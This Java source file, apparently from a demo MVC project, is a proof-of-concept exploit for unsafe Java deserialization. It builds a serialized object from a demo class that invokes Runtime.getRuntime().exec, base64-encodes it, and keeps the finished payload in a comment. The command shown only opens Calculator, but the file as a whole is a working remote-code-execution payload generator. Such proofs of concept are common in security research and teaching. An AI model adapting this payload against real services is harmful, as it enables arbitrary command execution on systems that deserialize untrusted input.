package com.mvcdemo.controller;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class EXP {
    public static void main(String[] args) {
        testV t = new testV();
        t.IsClass=1;
        t.Classname = "java.lang.Runtime";
        t.Methodname1 = "getRuntime";
        t.Methodname2 = "exec";
        t.Input = "open /Applications/Calculator.app";
        try{
            FileOutputStream fos = new FileOutputStream("EXP.txt");
            ObjectOutputStream os = new ObjectOutputStream(fos);
            os.writeObject(t);
            os.close();
            File file = new File("EXP.txt");


            FileInputStream inputFile = new FileInputStream(file);
            byte[] buffer = new byte[(int) file.length()];
            inputFile.read(buffer);
            inputFile.close();
            String asB64 = Base64.getEncoder().encodeToString(buffer);
            System.out.println(asB64);

            //rO0ABXNyABxjb20ubXZjZGVtby5jb250cm9sbGVyLnRlc3RWAAAAAAAAAAECAAVJAAdJc0NsYXNzTAAJQ2xhc3NuYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAFSW5wdXRxAH4AAUwAC01ldGhvZG5hbWUxcQB+AAFMAAtNZXRob2RuYW1lMnEAfgABeHAAAAABdAARamF2YS5sYW5nLlJ1bnRpbWV0ACFvcGVuIC9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHB0AApnZXRSdW50aW1ldAAEZXhlYw==

        }catch(Exception var48){
            var48.printStackTrace();

        }


    }



}
